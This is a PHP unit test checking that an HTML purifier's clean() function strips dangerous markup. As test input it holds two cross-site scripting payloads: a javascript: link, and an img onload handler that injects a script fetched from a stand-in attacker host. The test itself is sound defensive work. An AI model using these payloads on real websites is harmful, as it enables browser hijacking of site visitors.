<?php

class PurifierTest extends TestCase
{

    public function testConstructor()
    {
        $this->assertTrue(true);
    }

    /**
     * Tests the Purifier clean() function on HTML elements
     *
     * @return void
     */
    public function testClean()
    {
        $safe_link = '<a href="https://google.com">This is a safe link</a>';
        $dangerous_link = '<a href="javascript:alert(\'xss\')">This is a dangerous link</a>';
        $dangerous_image = '<img onload="var s = document.createElement(\'script\'); s.src=\'http://bad-website/bad/beef/magic.js.php\';document.getElementsByTagName(\'head\')[0].appendChild(s);" src="https://placehold.it/32" />';
        $title_text = '<h1>Sample title stripped to paragraph tags</h1>';

        $this->assertEquals('<p><a>This is a dangerous link</a></p>', clean($dangerous_link));
        $this->assertEquals('<p><a href="https://google.com">This is a safe link</a></p>', clean($safe_link));
        $this->assertEquals('<p><img src="https://placehold.it/32" alt="32" /></p>', clean($dangerous_image));
        $this->assertEquals('<p>Sample title stripped to paragraph tags</p>', clean($title_text, 'titles'));
    }

}
